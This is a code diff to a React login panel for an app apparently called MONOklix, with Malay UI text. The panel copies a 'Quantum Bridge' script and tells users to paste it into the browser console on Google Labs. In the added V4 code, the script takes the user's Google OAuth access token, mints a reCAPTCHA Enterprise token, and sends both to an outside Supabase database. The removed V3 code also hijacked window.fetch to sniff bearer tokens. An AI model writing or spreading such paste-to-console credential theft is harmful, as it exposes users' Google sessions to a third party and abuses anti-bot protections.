@@ -95,7 +95,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     const [isBridgeActive, setIsBridgeActive] = useState(false);
     const fileInputRef = useRef<HTMLInputElement>(null);
 
-    // REAL-TIME LISTENER: Listen to token changes in DB
+    // REAL-TIME LISTENER
     useEffect(() => {
         const channel = supabase
             .channel('token-sync')
@@ -136,14 +136,31 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     const copyBridgeSnippet = () => {
         const snippet = `
 (async () => {
-  console.log("%c MONOklix Quantum Bridge V3 (Predator) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+  console.log("%c MONOklix Quantum Bridge V4 (Ultimate Sync) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
   
   const userId = "${currentUser.id}";
   const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
   let ya29 = "";
 
-  const syncToMonoklix = async (token) => {
-    console.log("🚀 Syncing token to MONOklix...");
+  try {
+    // 1. Capture ya29
+    const sessionRes = await fetch("https://labs.google/fx/api/auth/session");
+    if(sessionRes.ok) {
+        const data = await sessionRes.json();
+        ya29 = data.accessToken || data.access_token || data.token;
+    }
+
+    if(!ya29) throw new Error("Gagal mengambil ya29. Pastikan tab Flow aktif.");
+
+    // 2. Generate reCAPTCHA Token
+    console.log("🔐 Generating reCAPTCHA verification...");
+    const recaptchaToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
+    
+    // 3. Combine into Hybrid Payload
+    const hybridPayload = ya29 + "[REC]" + recaptchaToken;
+
+    // 4. Sync ke MONOklix
+    console.log("🚀 Syncing Ultimate Payload to MONOklix...");
     const res = await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
       method: "PATCH",
       headers: {
@@ -151,57 +168,21 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
         "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({ personal_auth_token: token })
+      body: JSON.stringify({ personal_auth_token: hybridPayload })
     });
+
     if(res.ok) {
-       console.log("%c ✅ SUCCESS! MONOklix is now Active. ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
-       alert("SINKRONISASI BERJAYA! MONOklix sedia digunakan.");
+       console.log("%c ✅ ULTIMATE SYNC SUCCESS! ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+       alert("SINKRONISASI ULTIMATE BERJAYA! Veo & Imagen kini sedia digunakan.");
     }
-  };
-
-  try {
-    // 1. Cuba tarik dari internal session API Google
-    console.log("🔍 Attempting Direct Session Scraping...");
-    const sessionRes = await fetch("https://labs.google/fx/api/auth/session");
-    if(sessionRes.ok) {
-        const data = await sessionRes.json();
-        ya29 = data.accessToken || data.access_token || data.token;
-    }
-
-    // 2. Jika gagal, cuba teknik "Network Sniffing" (Intercept fetch)
-    if(!ya29) {
-        console.log("📡 Direct Scraping blocked. Activating Network Sniffer...");
-        const originalFetch = window.fetch;
-        window.fetch = function() {
-            const authHeader = arguments[1]?.headers?.Authorization;
-            if(authHeader && authHeader.startsWith('Bearer ya29.')) {
-                ya29 = authHeader.replace('Bearer ', '');
-                console.log("🎯 Sniffed token from Network Traffic!");
-                window.fetch = originalFetch; // Restore fetch
-                syncToMonoklix(ya29);
-            }
-            return originalFetch.apply(this, arguments);
-        };
-        console.log("%c 🛰️ Sniffer Active! Sila klik mana-mana butang atau refresh sikit di tab ini untuk trig trafik. ", "color: #f59e0b; font-weight: bold;");
-        
-        // Trigger satu request untuk paksa trafik muncul
-        fetch("https://labs.google/fx/api/auth/session");
-    } else {
-        console.log("🎯 Captured token from Session API.");
-        await syncToMonoklix(ya29);
-    }
-
-    // 3. reCAPTCHA Verified (PINHOLE_GENERATE)
-    console.log("🔐 Requesting Verified reCAPTCHA session...");
-    await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
-
   } catch (e) {
-    console.error("❌ Predator Bridge Error:", e.message);
+    console.error("❌ Bridge Error:", e.message);
+    alert("Ralat: " + e.message);
   }
 })();`.trim();
         
         navigator.clipboard.writeText(snippet);
-        alert("Quantum Bridge V3 (Predator) disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
+        alert("Quantum Bridge V4 (Ultimate Sync) disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
     };
 
     return (
@@ -232,7 +213,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                         onClick={copyBridgeSnippet}
                         className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
                     >
-                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (V3)
+                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (V4)
                     </button>
                     <a 
                         href="https://labs.google/fx/tools/flow" 
@@ -246,7 +227,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 
                 <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
                     <ShieldCheckIcon className="w-3 h-3 text-green-500" />
-                    STATUS: PREDATOR MODE READY
+                    STATUS: ULTIMATE HANDSHAKE (V4) READY
                 </div>
             </div>
 
